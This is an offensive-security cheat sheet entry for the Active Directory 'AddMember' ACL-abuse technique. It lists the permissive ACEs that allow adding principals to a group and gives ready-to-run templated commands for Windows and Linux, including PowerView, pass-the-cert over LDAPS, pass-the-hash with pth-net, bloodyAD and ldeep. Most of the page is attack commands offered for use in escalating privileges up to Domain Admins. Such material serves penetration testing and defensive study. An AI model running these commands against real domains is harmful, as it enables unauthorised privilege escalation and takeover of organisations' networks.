---
technique: AddMember
category: acl-abuse
ace: GenericAll, GenericWrite, Self, AllExtendedRights, Self-Membership
targets: Group
protocols: LDAP
remote_capable: true
tags: acl-abuse dacl ad group-member ldap
---

# AddMember

When a controlled object holds a permissive ACE over a group, that ACE can be abused to write any principal into the group's `member` attribute. The resulting group membership grants whatever rights or access the group holds, from local admin on specific machines to Domain Admins.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control of the object |
| GenericWrite | Write to non-protected attributes |
| Self | Self-referential attribute writes (add yourself only) |
| AllExtendedRights | All extended rights, including Self-Membership |
| Self-Membership | The specific extended right to add or remove self from the group |

## Windows

Native tools require no additional dependencies. PowerView and PassTheCert cover scenarios where RSAT is unavailable or cert-based auth is needed.

### net group (domain)

#cmd #native #domain

Add a user to a domain group from CMD.

```cmd title:"Add user to domain group via net group"
net group "$target_group" "$target_user" /add /domain
```
<!-- cheat
var target_group
var target_user
-->

### net localgroup

#cmd #native #local

Add a user to a local group from CMD.

```cmd title:"Add user to local group via net localgroup"
net localgroup "$target_group" "$target_user" /add
```
<!-- cheat
var target_group
var target_user
-->

### Add-ADGroupMember

#powershell #rsat

Add a member using the RSAT Active Directory PowerShell module.

```powershell title:"Add member to group with RSAT AD module"
Add-ADGroupMember -Identity "$target_group" -Members "$target_user"
```
<!-- cheat
var target_group
var target_user
-->

### Add-DomainGroupMember

#powershell #powerview

Add a member using PowerView (PowerSploit). Works without RSAT.

```powershell title:"Add member to group with PowerView"
Add-DomainGroupMember -Identity "$target_group" -Members "$target_user"
```
<!-- cheat
var target_group
var target_user
-->

### Step 1: Import module (Invoke-PassTheCert)

#powershell #certificate #ldaps

Import the Invoke-PassTheCert PowerShell module.

```powershell title:"Import Invoke-PassTheCert module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Step 2: Get LDAP connection (Invoke-PassTheCert)

#powershell #certificate #ldaps

Establish an LDAPS connection using a certificate via Invoke-PassTheCert.

```powershell title:"Get LDAP connection instance via certificate"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate cert.pfx
```
<!-- cheat
import domain_ip
-->

### Step 3: Add group member over LDAPS (Invoke-PassTheCert)

#powershell #certificate #ldaps

Add a member over LDAPS using a certificate via Invoke-PassTheCert.

```powershell title:"Add group member over LDAPS using certificate"
Invoke-PassTheCert -Action AddGroupMember -LdapConnection $ldap -Identity "$target_user_dn" -GroupDN "$target_group_dn"
```
<!-- cheat
var target_user_dn
var target_group_dn
var ldap
-->

## Linux

All tools below target LDAP on the domain controller.

### net rpc

#samr #password

Add a member using samba-client's `net` tool over SAMR. Useful when LDAP writes are blocked but SAMR is open.

```sh title:"Add group member via SAMR over RPC"
net rpc group addmem "$target_group" "$target_user" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import domain_ip
import users
import passwords
var target_group
var target_user
var rhost_name
-->

### pth-net

#samr #pth

Add a member using pth-toolkit's `pth-net`, which accepts an NT hash instead of a password.

```sh title:"Add group member via SAMR with NT hash"
pth-net rpc group addmem "$target_group" "$target_user" -U "$domain"/"$user"%"aad3b435b51404eeaad3b435b51404ee":"$nt_hash" -S "$rhost_name"
```
<!-- cheat
import domain_ip
import users
var target_group
var target_user
var nt_hash
var rhost_name
-->

### bloodyAD

#ldap #multi-auth

Add a member using bloodyAD. Auth method is selected via the auth menu.

```sh title:"Add group member via bloodyAD"
bloodyAD --host "$rhost_name" -d "$domain" -u "$user" $auth_flags add groupMember "$target_group" "$target_user"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_group
var target_user
-->

### ldeep

#ldap #dn-format

Add a member using ldeep. Both arguments must be in full DN format.

```sh title:"Add group member via ldeep (both args in DN format)"
ldeep ldap -d "$domain" -s "$rhost_ip" -u "$user" -p "$pass" add_to_group "$target_user_dn" "$target_group_dn"
```
<!-- cheat
import domain_ip
import users
import passwords
var target_user_dn
var target_group_dn
-->
